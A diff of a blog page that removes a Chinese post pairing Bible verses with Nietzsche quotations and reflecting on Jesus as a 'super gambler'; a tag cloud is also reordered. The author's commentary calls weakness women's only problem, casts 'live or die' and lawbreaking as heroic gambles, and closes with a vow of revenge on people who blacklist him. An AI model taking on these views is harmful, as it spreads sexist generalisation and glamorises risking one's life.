-<p>⁴ 脚镣 &#x3D;&gt;<br>我们都仆倒在地上，我就听见有声音用希伯来土话对我说：「扫罗，扫罗，你为什么逼迫我？你用脚跟踢<strong>犁棍</strong>是难的。」<br> (使徒行传 26:14 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>⁴ 脚镣 &#x3D;&gt;<br>故此、为要使我不至于因这些启示之高超性而过于高抬自己，便有一种<strong>刺痛</strong>给了我、在肉身上、就是撒但的使者、来折磨我，免得我过于高抬自己。为了这事、我曾三次求过主、叫这<strong>刺痛</strong>离开我。他对我说：『我的恩是够你用的；因为能力是在软弱上才显得完全的。』<br> (哥林多后书 12:7-9 吕振中)</p>
-</blockquote>
-<p>尼采参赌的勇气让他无愧于「超级赌徒」之名。</p>
-<hr>
-<blockquote>
-<p>⁵ 僭妄的话 &#x3D;&gt;<br>「不过，若有神言人擅自奉我的名说我不曾吩咐他说的话，或是奉别的神的名说话，那神言人就必须死。」但你若心里说：「我们怎能知道什么是永恒主所没有说过的话呢？」一个神言人奉永恒主的名所说的、那话若不成就，不实现，那就是永恒主没有说过的话；是那神言人擅自说的，你不要惧怕他。<br> (申命记 18:20-22 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>『我们曾听见他说，「我要拆毁这人手造的殿堂，三日之间要建造另一座不是人手造的。」』<br> (马可福音 14:58 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>耶稣说：『我就是；你们必看见人子坐在「权能」的右边，驾着天云来临。』<br> (马可福音 14:62 吕振中)</p>
-</blockquote>
-<hr>
-<blockquote>
-<p>你们能体验到的最伟大的事是什么呢？那便是大轻蔑之时刻。那时候，你们的幸福，使你们觉得讨厌，你们的理智与道德也是一样。<br>ーー《查拉斯图拉如是说》，三</p>
-</blockquote>
-<ul>
-<li>「轻蔑」也是人的一种必要情感。对于「幸福」的轻蔑让我们成为「超级赌徒」。</li>
-<li>尼采推翻了三千多年来以「骄傲」为「原罪」的「奴隶价值观」。<ul>
-<li>其实，在《圣经》里，「原罪」并非源于「骄傲」，反而「骄傲」来源于「原罪」。在基督徒那里，「轻蔑」仅仅被用来对待「撒旦」以及「邪灵」。</li>
-<li>一方面，尼采参赌的勇气让我们印象深刻；另一方面，我们也应该注意到，尼采狂躁了、精神分裂了。从我自己的生活体验来看，「轻蔑」也是一种缺乏「爱他者」的状态。「缺乏被爱」的孤独，导致着，混乱、无序。</li>
-</ul>
-</li>
-</ul>
-<hr>
-<blockquote>
-<p>今后我不再称你们为仆人了，因为仆人不知道主人⁶所作的事；我乃是称你们为朋友，因为我从我父所听见的一切事，我都让你们知道了。<br> (约翰福音 15:15 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>⁶ 主人 &#x3D;&gt;<br>你们所能体验到的最伟大的事是什么？那便是<strong>无所畏惧</strong>之时刻。那便是<strong>豪情万丈</strong>之时刻。那时候，你们的幸福，被你们所漠视，你们的理智与道德也是一样。</p>
-</blockquote>
-<p>人们成为「主人」，也成为「许佩伯雷人」。在《圣经・启示录》中，也有「得胜者」「Overcomer」的说法。</p>
-<hr>
-<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><blockquote>
-<p>愿大地上升与天同等。<br>愿我们的旨意行在其上。<br>让我们吃喝享受自己的身体和血。<br>让我们爱大地并且爱人如己。<br>唯有爱人如己洗尽一切责备。<br>爱自己就得以完全自己。<br>愿死人复活就在此时此地。</p>
-</blockquote>
-<blockquote>
-<p>明亮之星，启明之子啊，<br>你怎么从天上坠落啊！<br>你这使列国屈服的，<br>你怎么被砍倒于地上啊！<br>你心里曾说：<br>「我必升到天上；<br>我必高设我的宝座<br>在高高之众星以上；<br>我必坐在诸神的聚会山上，<br>在<strong>北方之极处</strong>；<br>我必升到云霄丘上；<br>跟至高者同等。」<br>然而你竟被送下阴间，<br>到阴坑中的极深处了！<br> (以赛亚书 14:12-15 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>你因你的美丽而心里高傲；<br>又为了你的光华<br>而败坏你的才智。<br>我将你摔倒于地，<br>使你暴露身体于君王面前，<br>让他们目睹为快。<br> (以西结书 28:17 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>永恒主的话传与我说：『人子啊，你要向玛各地的歌革、米设土巴的人君领袖板着脸，传神言攻击他，说：主永恒主这么说：米设土巴的人君领袖歌革啊，你看，我跟你为敌；我必调转你，用钩子钩住你的腮颊，将你和你的全军、马匹马兵、都带出来，他们都穿着全副军装，一大团队，有大牌小盾，都拿着刀剑；有波斯人、古实人、弗人、跟他们在一起，都拿着盾牌，戴着头盔；歌篾人和他的部队；<strong>北方极处</strong>陀迦玛族和他的部队——许多外族之民、都跟你在一起。』<br>(以西结书 38:1-6 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>『因此人子啊，你要传神言，对歌革说：主永恒主这么说：当我人民以色列安然居住的日子，你就必兴奋激动起来，从你的地方、从<strong>北方之极处</strong>、而来，你和许多外族之民跟你一同来，都骑着马，一大团队，极多军兵；你必上来攻击我人民以色列，像密云遮盖那地。日后我必带着你来攻击我的地，歌革啊，到我在列国人眼前借着你而彰显为圣时，他们好认识我。』<br>(以西结书 38:14-16 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>『人子啊，你要传神言攻击歌革，说：主永恒主这么说：米设土巴的人君领袖、歌革啊，你看，我跟你为敌；我必调转你，领你往前进，使你从<strong>北方之极处</strong>上来，带着你来攻以色列的众山；然后我必将你的弓从你左手上击落，将你的箭从你右手上打掉。你必倒毙在以色列的众山上，你和你的全部队、以及跟随你的外族民都要倒毙；我必将你给各种羽族的肉食鸟、和田野的走兽、做食物。你必倒毙在田野上；因为我说了，主永恒主发神谕说。我必降火在玛各沿海地带安然居住的人身上；他们就知道我乃是永恒主。』<br>(以西结书 39:1-6 吕振中)</p>
-</blockquote>
-<hr>
-<blockquote>
-<p>And out of the ground Jehovah God caused to grow every tree that is pleasant to the sight and good for food, as well as the tree of life in the middle of the garden and the tree of the knowledge of good and evil.<br> (Genesis 2:9 Recovery Version)</p>
-</blockquote>
-<div class="tabs" id="knowledge"><ul class="nav-tabs"><li class="tab active"><a href="#knowledge-1">Knowledge</a></li><li class="tab"><a href="#knowledge-2">知识</a></li></ul><div class="tab-content"><div class="tab-pane active" id="knowledge-1"><blockquote>
-<p>But of the tree of the knowledge of good and evil, of it you shall not eat; for in the day that you eat of it you shall surely die.</p>
-<hr />
- (Genesis 2:17 Recovery Version)
-</blockquote></div><div class="tab-pane" id="knowledge-2"><blockquote>
-<p>只是那能使人分别善恶的知识树的果子，你却不可吃；因为你吃的日子、你一定死。</p>
-<hr />
- (创世记 2:17 吕振中)
-</blockquote></div></div></div>
-
-<blockquote>
-<p>And death and Hades were cast into the lake of fire. This is the second death, the lake of fire.<br> (Revelation 20:14 Recovery Version)</p>
-</blockquote>
-<hr>
-<div class="tabs" id="greatest-contempt"><ul class="nav-tabs"><li class="tab active"><a href="#greatest-contempt-1">Greatest Contempt</a></li><li class="tab"><a href="#greatest-contempt-2">大轻蔑</a></li><li class="tab"><a href="#greatest-contempt-3">伟大的轻蔑</a></li></ul><div class="tab-content"><div class="tab-pane active" id="greatest-contempt-1"><blockquote>
-<p>“What is the greatest thing you can experience? It is the hour of your greatest contempt. The hour in which even your happiness becomes loathsome to you, and so also your reason and virtue.<br>“The hour when you say: ‘What good is my happiness? It is poverty and filth and miserable self-complacency. But my happiness should justify existence itself!’<br>“The hour when you say: ‘What good is my reason? Does it long for knowledge as the lion for his prey? It is poverty and filth and miserable self-complacency!’<br>“The hour when you say: ‘What good is my virtue? It has not yet driven me mad! How weary I am of my good and my evil! It is all poverty and filth and miserable self-complacency!’<br>“The hour when you say: ‘What good is my justice? I do not see that I am filled with fire and burning coals. But the just are filled with fire and burning coals!’<br>“The hour when you say: ‘What good is my pity? Is not pity the cross on which he is nailed <strong>who loves man</strong>? But my pity is no crucifixion!’<br>“Have you ever spoken like this? Have you ever cried like this? Ah! If only I had heard you cry this way!<br>“It is not your sin - it is your moderation that cries to heaven; your very sparingness in sin cries to heaven!<br>“Where is the lightning to lick you with its tongue? Where is the madness with which you should be cleansed?<br>“Behold, I bring you the Superman! He is that lightning, he is that madness!</p>
-<hr />
-ーー「Thus Spoke Zarathustra」, 3
-</blockquote></div><div class="tab-pane" id="greatest-contempt-2"><blockquote>
-<p>　　你们能体验到的最伟大的事是什么呢？那便是大轻蔑之时刻。那时候，你们的幸福，使你们觉得讨厌，你们的理智与道德也是一样。<br>　　那时候，你们说：‘我的幸福值什么！它是贫乏、污秽与可怜的自满。可是我的幸福正应当使生存有意义的！’<br>　　那时候，你们说：‘我的理智值什么！它是否渴求知识像狮子贪爱捕获物一样呢？它是贫乏、污秽与可怜的自满！’<br>　　那时候，你们说：‘我的道德值什么！它还不曾使我狂热过。我是怎样地疲倦于我的善与恶呵！这一切都是贫乏、污秽与可怜的自满！’<br>　　那时候，你们说：‘我的正义值什么！我不觉得我是火焰与炭。但是正直者应当是火焰与炭的！’<br>　　那时候，你们说：‘我的怜悯值什么！怜悯不是那钉死<strong>爱人类者</strong>的十字架吗？但是我的怜悯不是一个十字架刑。’<br>　　你们已经这样说过了吗？你们已经这样喊过了吗？唉！我何以不曾听到你们这样喊叫呢！<br>　　这不是你们的罪恶，而是你们的节制，向天呼喊；你们对于罪恶的厌恶向天呼喊！<br>　　那将用舌头舔你们的闪电何在？那应当给你们注射的疯狂又何在？<br>　　现在我教你们什么是超人：他便是这闪电，这疯狂！——</p>
-<hr />
-ーー《查拉斯图拉如是说》，三
-</blockquote></div><div class="tab-pane" id="greatest-contempt-3"><blockquote>
-<p>　　你们有可能经历的最伟大的事情是什么呢？是伟大的轻蔑时刻。在这一时刻，你们的幸福令你们厌恶，你们的理智和道德也是一样。<br>　　在这一时刻，你们说：“我的幸福算得了什么！它是贫乏、龌龊、一种可怜巴巴的舒适。我的幸福应为生存（Dasein）本身辩护！”<br>　　在这一时刻，你们说：“我的理智算得了什么！理智对知识的渴求仿佛狮子渴求食物吗？它是贫乏、龌龊、一种可怜巴巴的舒适！”<br>　　在这一时刻，你们说：“我的美德算得了什么！它还没有让我激怒。我多么厌倦自己的善与恶啊！这一切全是贫乏、龌龊、一种可怜巴巴的舒适！”<br>　　在这一时刻，你们说：“我的正义算得了什么！我不认为我是火焰和燃料。正直之人才是火焰和燃料！”<br>　　在这一时刻，你们说：“我的同情算得了什么！同情难道不就是那个十字架，那个<strong>爱人者</strong>被钉在上面的十字架吗？我的同情不是被钉上十字架。”<br>　　你们如此言说了吗？你们如此呼喊了吗？唉，但愿我听见你们已这样呼喊！<br>　　不是你们的罪过——而是你们的满足感向天呼喊，是你们罪过中的贪婪向天呼喊！<br>　　闪电，用火舌舔食你们的闪电在何方？必须给你们注射的疯狂在何方？<br>　　看呀，我给你们教授超人：超人就是这闪电，就是这疯狂！——</p>
-<hr />
-ーー《扎拉图斯特拉如是说》，三
-</blockquote></div></div></div>
-
-<p>这段文字真诚得「光芒万丈」。但是，耶稣其实也是『许佩伯雷人』。他并不是为了「公正」而走上『十字架』的——因为针对『罪过』给予<strong>恰如其分</strong>的「惩罚」才是「公正」。他是为了把人性根源处的「惧怕」赶出而走上『十字架』的。这是那时的他作为一个有限的人所能想出的唯一方法。这都是出于<strong>爱</strong>。</p>
-<hr>
-<blockquote>
-<p>会堂里的众人听了这话，都满心暴怒，就起来，撵他出城，带他到山崖上（他们的城是建在山上的），要把他推下去。他却从他们中间过去，径自走他的路去了。<br> (路加福音 4:28-30 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>于是他们拿起石头来、要打他；耶稣却径自隐藏着，出殿去了。<br> (约翰福音 8:59 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>于是他们又想法子要逮他；他却径自从他们手里出来了。<br> (约翰福音 10:39 吕振中)</p>
-</blockquote>
-<iframe style="width: 90%; aspect-ratio: 16/9;" src="https://www.youtube.com/embed/DL6A2bICUkc" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-
-<blockquote>
-<p>他们来到一个园地，名叫客西马尼；耶稣就对他的门徒说：『你们坐在这里，等我祷告。』于是带着彼得雅各和约翰、同他到一边去，就非常<strong>惊恐</strong>，极其难过。对他们说：『我的心很是忧困、几乎要死。你们停留在这里，且儆醒着。』他就稍往前走，俯伏在地上祷告、能不能使那钟点离开他而过去。他说：『阿爸，父啊，在你万事都可能；把这杯撤去吧；但不要照我所愿的，只要照你所愿的。』<br> (马可福音 14:32-36 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>人替朋友放弃性命；没有爱比这个大的。<br> (约翰福音 15:13 吕振中)</p>
-</blockquote>
-<hr>
-<blockquote>
-<p>神造万物，各按其时成为美好，又将<strong>永远</strong>安置在世人心里。虽是这样，人并不能参透神从始至终的作为。<br> (传道书 3:11 恢复本)</p>
-</blockquote>
-<p>超级赌徒的格局：<br>什么是成功？——「要么永远；要么没命。既然来到这个世界、既然注定会离开，不拿自己的性命去赌一把，这一生还有什么意思？」<br>就像贵主耶稣上了十字架豪赌了一把，结果复活了。不管他会不会复活，从走上十字架的那刻起，他就当之无愧地配得上「超级赌徒」的名号。</p>
-<hr>
-<blockquote>
-<p>当那一天，到了傍晚，耶稣对他们说：『我们渡到那边去吧。』他们就离开群众，照他在船上的情况把他带走；还有别的船也跟他在一起。当下起了大暴风，波浪泼进船内，甚至船简直满了！耶稣竟在船尾上靠着枕头睡觉呢；门徒就叫醒了他，对他说：『老师，我们丧命，你不在意么？』耶稣醒起来，斥责那风，向海说：『不要作声！噤默罢！』那风不狂吹，便大大平静了。耶稣对他们说：『为什么这么胆怯呢？怎么没有信心呢？』他们就大起了敬畏的心，直彼此说：『这个人到底是谁？连风和海也听从他！』<br>(马可福音 4:35-41 吕振中)</p>
-</blockquote>
-<p><strong>终极冒死者</strong>有着平静风海的心灵素质。主耶稣真是强壮啊！<br>一个赌徒的唯一问题就是他的女伴。因为女人的唯一问题就是软弱——由软弱而狭隘——不管是身体还是心灵。有了女伴，想做一个超级赌徒就难了。</p>
-<br />
-
-<div class="tabs" id="godless"><ul class="nav-tabs"><li class="tab active"><a href="#godless-1">无神论者</a></li><li class="tab"><a href="#godless-2">Godless</a></li></ul><div class="tab-content"><div class="tab-pane active" id="godless-1"><p>——但我在说什么？够了！够了！此时此刻唯一恰当的就是沉默：否则，我会挪用属于另一位的东西。他更年轻、「拥有更多未来」、更强大。——这东西是唯有扎拉图斯特拉有资格享有的，扎拉图斯特拉，这位无神论者……<br>｛《道德的谱系》（1887年），第二篇论文，第25节｝</p></div><div class="tab-pane" id="godless-2"><p>– But what am I saying? Enough! Enough! At this point just one thing is proper, silence: otherwise I shall be misappropriating something that belongs to another, younger man, one ‘with more future’, one stronger than me – something to which Zarathustra alone is entitled, Zarathustra the Godless …<br>｛On the Genealogy of Morality (1887), Second essay, 25｝</p></div></div></div>
-
-<p>「扎拉图斯特拉」的拜火教里没有死人复活的见证。<br>敌基督是不敬神的极北族人。主雅苏是不敬偶像的终极冒死者。</p>
-<br />
-
-<blockquote>
-<p>闪的子孙是<strong>以拦</strong>、亚述、亚法撒、路德、亚兰。亚兰的子孙是乌斯、户勒、基帖、玛施。亚法撒生沙拉，沙拉生希伯。<br>(创世记 10:22-24 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>犹大王西底家开始执掌国政的时候，永恒主的话论到<strong>以拦</strong>、传与神言人耶利米说：万军之永恒主这么说：<br>『看吧，我必折断<strong>以拦</strong>的弓、<br>其勇力之主要武器。<br>我必叫四面的风<br>从天之四边刮到<strong>以拦</strong>；<br>将他们分散到四方，<br>以致<strong>以拦</strong>被放逐的人<br>没有一国不到的。<br>我必使<strong>以拦人</strong>在其仇敌面前惊慌，<br>在寻索他们性命的人面前惶恐；<br>我必使灾祸、就是我的烈怒、临到他们，<br>永恒主发神谕说；<br>我必打发刀剑追杀他们，<br>直到将他们灭尽。<br>我必在<strong>以拦</strong>设立我的审判宝座，<br>从那里杀灭君王和首领：<br>这是永恒主发神谕说的。<br>&ZeroWidthSpace;<br>但日后我还要恢复<strong>以拦</strong>的故业：<br>永恒主发神谕说。』<br>&ZeroWidthSpace;<br>(耶利米书 49:34-39 吕振中)</p>
-</blockquote>
-<p>在希伯来语内部，『希伯』『希伯来人』『越过』三者共享同一词根系统，这种重合是结构性的，而不是巧合。<br>『以拦』与表示『隐藏』、『遥远』的闪语词根有关，因此被解释为：「远方之地」「隐藏之地」。这与以拦在美索不达米亚东部、相对以色列而言『遥远』的地理位置是吻合的。<br>在更广泛的古代近东研究中，很多学者认为『以拦』这个名称并非起源于希伯来语，而是来自以拦本地语言（埃兰语）。埃兰语中该地区自称为 𒉏𒈠𒀀𒉡（Haltamti &#x2F; Hatamti），意思常被解释为『高地』『山地之国』。</p>
-<br />
-
-<div class="tabs" id="faith-and-morality"><ul class="nav-tabs"><li class="tab active"><a href="#faith-and-morality-1">信仰与道德</a></li><li class="tab"><a href="#faith-and-morality-2">Faith and Morality</a></li></ul><div class="tab-content"><div class="tab-pane active" id="faith-and-morality-1"><p>G．艾略特¹。——他们摆脱了基督教的上帝，现在却更加坚定地相信必须坚持基督教道德。这是一种英国式的一贯做法；我们不打算为此责怪像艾略特这样的道德小女人。在英国，每当从神学中获得一点解放后，都必须以一种真正令人敬畏的方式来表明自己是多么的道德狂热，以此恢复自我。那就是他们在那里所付出的忏悔。<br><br /></p>
-<p>——我们则有所不同。如果一个人放弃了基督教信仰，就等于将基督教道德的权利从自己脚下抽走。这种道德绝对不是不言自明的：人们得不顾那些英国的平庸之辈，一遍又一遍地揭示这一点。基督教是一个体系，一套对事物作整体考虑的完整观点。如果从中摧毁一个核心概念，即对上帝的信仰，就会摧毁整个体系：没有任何必要的东西会留在手中。基督教假设人类不知道、也不能知道，对自己什么是好的，什么是恶的：他相信上帝，只有上帝知道。基督教道德是一种命令，其来源是超验的；它超越一切批评及批评的权利之上；只有当上帝是真理时，它才拥有真理——它与对上帝的信仰共存亡。<br><br /></p>
-<p>——当英国人实际上相信他们「直觉地」知道什么是善恶时，当他们因此认为基督教作为道德的保证已经不再必要时，我们目睹的仅仅是基督教价值判断的统治（Herrschaft）效应，以及这一统治所展现出的力量（Stärke）和深度：如此一来，英国道德的起源被遗忘了，其存在权利的极为有条件的（Sehr-Bedingte）特性也不再被感知。对英国人而言，道德还不是一个问题。<br><br /></p>
-<p>｛偶像的黄昏，一个不合时宜者的漫游，5。｝<br><br /></p>
-<blockquote>
-<p>¹ 艾略特（George Eliot, 1819-80） &#x3D;&gt;</p>
-<hr />
-英国女作家。其著作主要带有哲学和社会政治倾向的印记。她早年背弃清教主义的基督教，在斯特劳斯（David Friedrich Strauß）和费尔巴赫（Ludwig Feuerbach, 1804-72）的影响下，维护一种自由的、不受宗教限制的伦理学。尼采假定艾略特具有无意识的摇摆性，虽然背离基督教信仰，但还是以一种新的伦理学，必然地重新接受了基督教的思想财富。
-</blockquote></div><div class="tab-pane" id="faith-and-morality-2"><p>G. Eliot¹. — They are rid of the Christian God and now believe all the more firmly that they must cling to Christian morality. That is an English consistency; we do not wish to hold it against little moralistic females à la Eliot. In England one must rehabilitate oneself after every little emancipation from theology by showing in a veritably awe-inspiring manner what a moral fanatic one is. That is the penance they pay there.<br><br /></p>
-<p>— We others hold otherwise. When one gives up the Christian faith, one pulls the right to Christian morality out from under one’s feet. This morality is by no means self-evident: this point has to be exhibited again and again, despite the English flatheads. Christianity is a system, a whole view of things thought out together. By breaking one main concept out of it, the faith in God, one breaks the whole: nothing necessary remains in one’s hands. Christianity presupposes that man does not know, cannot know, what is good for him, what evil: he believes in God, who alone knows it. Christian morality is a command; its origin is transcendent; it is beyond all criticism, all right to criticism; it has truth only if God is the truth — it stands and falls with faith in God.<br><br /></p>
-<p>— When the English actually believe that they know “intuitively” what is good and evil, when they therefore suppose that they no longer require Christianity as the guarantee of morality, we merely witness the effects of the dominion (Herrschaft) of the Christian value judgment and an expression of the strength (Stärke) and depth of this dominion: such that the origin of English morality has been forgotten, such that the very conditional (Sehr-Bedingte) character of its right to existence is no longer felt. For the English, morality is not yet a problem.<br><br /></p>
-<p>｛Twilight of the Idols. Wandering of untimely ones. 5.｝<br><br /></p>
-<blockquote>
-<p>¹ Eliot (George Eliot, 1819-80) &#x3D;&gt;</p>
-<hr />
-British female writer. Her works mainly bear the imprint of philosophical and socio-political tendencies. In her early years, she renounced the Puritan Christian faith and, under the influence of Strauss (David Friedrich Strauß) and Feuerbach (Ludwig Feuerbach, 1804-72), advocated a free, religion-independent ethics. Nietzsche assumed that Eliot had an unconscious inconsistency, as despite her departure from Christian faith, she inevitably re-embraced Christian intellectual heritage through a new ethical system.
-</blockquote></div></div></div>
-
-<hr>
-<blockquote>
-<p>请拒绝成为一个追随贵主耶稣的法利赛人¹。</p>
-</blockquote>
-<blockquote>
-<p>¹ 法利赛人 &#x3D;&gt;<br>经学士和法利赛人、假冒为善的人哪，你们有祸啊！因为你们<strong>周游</strong>了洋海旱地，使一个人成了<strong>归依</strong>人，既归依了，你们又使他做该入<strong>地狱</strong>的人，比你们还加倍！<br> (马太福音 23:15 吕振中)</p>
-</blockquote>
-<p>什么样的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%B3%95%E5%88%A9%E8%B5%9B%E4%BA%BA">法利赛人</a>会周游了洋海旱地？在我的印象中，犹太人好像不怎么传教吧？</p>
-<hr>
-<blockquote>
-<p>¹ 法利赛人 &#x3D;&gt;<br>你们律法师有祸啊！因为你们把<strong>知识的钥匙</strong>拿了去，自己不进入，连那正进入的、你们也拦阻。<br> (路加福音 11:52 吕振中)</p>
-</blockquote>
-<p>什么叫做「知识的钥匙」？我们该怎么对待科学实证呢？</p>
-<hr>
-<blockquote>
-<p>便开始教训他们说：『人子必须受许多苦，被长老祭司长和经学士弃掉，并且被杀，三天以后就复起。』耶稣坦然无隐地讲这话。彼得便拉他到旁边，谏诤他。耶稣转过身来，看着门徒，就责备彼得说：『撒但退去！因为你不意念着上帝的事，却意念着人的事。』<br> (马可福音 8:31-33 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>于是呼召群众同门徒，对他们说：『人若想要跟着我，就当弃绝自己，拿起他的十字架来跟从我。因为凡想要救自己性命的、必失掉真性命；凡为我和<strong>福音</strong>的缘故失掉自己性命的、必救得真性命。人赢得全世界，而赔上了自己的性命，有什么益处呢？人能拿出什么来对换自己的性命呢？在这淫乱有罪的世代、凡以我和我的为可耻的，人子带着他父的荣耀和圣天使来临的时候、也必以那人为可耻。』<br> (马可福音 8:34-38 吕振中)</p>
-</blockquote>
-<p>耶稣在此和在客西马尼一样直面豪赌，却表现出法利赛人的爱——让人为他和福音的缘故失掉自己性命。然而，各人有各人自己的终极赌局。</p>
-<hr>
-<p>这场小型赌博，说到底，其实就是这样一个简单的选择：是，忙着学习复习？还是，忙着研究无果？ —— 要么发现真实；要么迷茫虚空。<br>这场中型赌博，说到底，其实就是这样一个简单的选择：是，忙着维持生计？还是，忙着投资破产？ —— 要么翻倍；要么归零。<br>这场大型赌博，说到底，其实就是这样一个简单的选择：是，忙着适应生活？还是，忙着违法坐牢？ —— 要么几亿；要么坐牢。<br>这场终极赌博，说到底，其实就是这样一个简单的选择：是，忙着活着？还是，忙着去死？ —— 要么永远；要么没命。</p>
-<hr>
-<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><blockquote>
-<p>『看哪！日子快到（这是耶和华的宣告），我必使以色列家和犹大家人口和牲畜繁衍。我先前怎样留意把他们拔出、拆毁、倾覆、毁灭和降灾；将来我也必照样留意把他们建立和栽种起来。』这是耶和华的宣告。<br>『在那些日子，人必不再说：<br>「父亲吃了酸葡萄，<br>儿子的牙齿酸倒了。」<br>因为各人必因自己的罪孽死亡；吃酸葡萄的，那人的牙齿必酸倒。<br>(耶利米书 31:27-30 新译本)</p>
-<hr>
-<p>『看哪！日子快到（这是耶和华的宣告），我要与以色列家和犹大家订立新的约。这新约不像从前我拉他们祖先的手，领他们出埃及地的日子，与他们所立的约；我虽然是他们的丈夫，他们却违背了我的约。』这是耶和华的宣告。『但那些日子以后，我要与以色列家所立的约是这样（这是耶和华的宣告）：我要把我的律法放在他们里面，写在他们的心里。我要作他们的　神，他们要作我的子民。他们各人必不再教导自己的邻舍和自己的同胞，说：「你们要认识耶和华。」因为所有的人，从最小到最大的都必认识我。我也要赦免他们的罪孽，不再记着他们的罪恶。』这是耶和华的宣告。<br>(耶利米书 31:31-34 新译本)</p>
-</blockquote>
-<hr>
-<blockquote>
-<p>连我们的仇敌自己也评判：<br> 他们的磐石不如我们的磐石。<br> (申命记 32:31 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>因为他们的葡萄树是所多玛的葡萄树传的，<br> 是蛾摩拉的田园出的；<br> 他们的葡萄是毒的葡萄，<br> 他们那一挂一挂都是苦的。<br> 他们的酒是大蛇的毒素，<br> 是虺蛇猛烈冷酷的毒。<br> (申命记 32:32-33 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>这不都是积聚在我这里，<br> 密封在我宝库中，<br> 要等待伸冤报应的日子，<br> 等待他们的脚颠踬的时候么？<br> 因为他们遭遇灾难的日子近了，<br> 那准备要临到他们身上的<br> 就要迅速地来临。<br> (申命记 32:34-35 吕振中)</p>
-</blockquote>
-<hr>
-<blockquote>
-<p>你不要说：『我要以恶报恶』；<br> 你要等候永恒主，他就救助你。<br> (箴言 20:22 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>弟子啊，你的心若有智慧，<br> 我的心也欢喜。<br> 你的嘴说对的事之时，<br> 我的心肠就欢跃。<br> 你心里不要羡慕罪人；<br> 只要终日不断地敬畏永恒主。<br> 因为总有好结局；<br> 你的希望必不至于断绝。<br> (箴言 23:15-18 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>仇恨你的若饿了，你就给他饭吃；<br> 若渴了，你就给他水喝；<br> 因为这样行，你是捏炭火堆在他头上，<br> 永恒主必赏报你。<br> (箴言 25:21-22 吕振中)</p>
-</blockquote>
-<hr>
-<blockquote>
-<p>逼迫你们的，要给他们祝福：要祝福，别咒诅了；要和喜乐的人同喜乐，和哭泣的人同哭泣；彼此相待、要存着同样的心意；不要意念着高傲的事，要俯就着卑微的事；别自以为精明了。不要以恶报恶；众人以为美好的、务要筹谋。若是可能，总要尽其在你们的、跟众人和睦。<br> (罗马书 12:14-18 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>亲爱的，不要自己伸冤，宁可给上帝的义怒留地步；因为经上记着说：『主说，伸冤在我，我必报应。』不，『你的仇敌若饿了，你要分给他吃；若渴了，你要给他喝；因为你这样行、就是把烧𤏲的炭堆在他头上。』别为恶所胜了，总要以善胜恶。<br> (罗马书 12:19-21 吕振中)</p>
-</blockquote>
-<p>我的怜悯是什么呢？<br>我的怜悯就是注销自己的账号。<br>我的怜悯就是在黑名单里注销自己。<br>因为黑名单对我来说就是仇敌名单。<br>凡是把我放入黑名单的人，<br>凡是在我的黑名单里的人，<br>我必报应。</p>
-
-	
-	</div>
-	
-  
-</div>
-	<a type="button" href="/2021/09/29/堅持學日語・尼采/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -3293,45 +3938,45 @@ British female writer. Her works mainly bear the imprint of philosophical and so
 		<h4 style="margin-top: 18px;">Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">
 		
-			<li><a href="/tags/Imaging/">Imaging<span>3</span></a></li>
-		
-			<li><a href="/tags/Notebooks/">Notebooks<span>13</span></a></li>
-		
-			<li><a href="/tags/Bible/">Bible<span>2</span></a></li>
+			<li><a href="/tags/BioBuilder/">BioBuilder<span>12</span></a></li>
 		
 			<li><a href="/tags/UltimateFacts/">UltimateFacts<span>4</span></a></li>
 		
-			<li><a href="/tags/箴言/">箴言<span>2</span></a></li>
-		
-			<li><a href="/tags/Lyrics/">Lyrics<span>4</span></a></li>
-		
-			<li><a href="/tags/Logotherapy/">Logotherapy<span>3</span></a></li>
+			<li><a href="/tags/Quantum/">Quantum<span>5</span></a></li>
 		
 			<li><a href="/tags/Syt-7/">Syt-7<span>1</span></a></li>
 		
-			<li><a href="/tags/BioBuilder/">BioBuilder<span>12</span></a></li>
-		
-			<li><a href="/tags/雅歌/">雅歌<span>2</span></a></li>
-		
 			<li><a href="/tags/Neuro/">Neuro<span>5</span></a></li>
-		
-			<li><a href="/tags/Pharisee/">Pharisee<span>2</span></a></li>
-		
-			<li><a href="/tags/Nietzsche/">Nietzsche<span>3</span></a></li>
-		
-			<li><a href="/tags/Bot-Development/">Bot Development<span>1</span></a></li>
 		
 			<li><a href="/tags/诗篇/">诗篇<span>2</span></a></li>
 		
-			<li><a href="/tags/Psalms/">Psalms<span>11</span></a></li>
-		
-			<li><a href="/tags/Quantum/">Quantum<span>5</span></a></li>
-		
-			<li><a href="/tags/Metaverse/">Metaverse<span>12</span></a></li>
+			<li><a href="/tags/Logotherapy/">Logotherapy<span>3</span></a></li>
 		
 			<li><a href="/tags/启示录/">启示录<span>3</span></a></li>
 		
+			<li><a href="/tags/Notebooks/">Notebooks<span>13</span></a></li>
+		
+			<li><a href="/tags/Bot-Development/">Bot Development<span>1</span></a></li>
+		
+			<li><a href="/tags/Metaverse/">Metaverse<span>13</span></a></li>
+		
+			<li><a href="/tags/Nietzsche/">Nietzsche<span>3</span></a></li>
+		
+			<li><a href="/tags/Imaging/">Imaging<span>3</span></a></li>
+		
+			<li><a href="/tags/Bible/">Bible<span>2</span></a></li>
+		
+			<li><a href="/tags/Psalms/">Psalms<span>11</span></a></li>
+		
 			<li><a href="/tags/Typography/">Typography<span>4</span></a></li>
+		
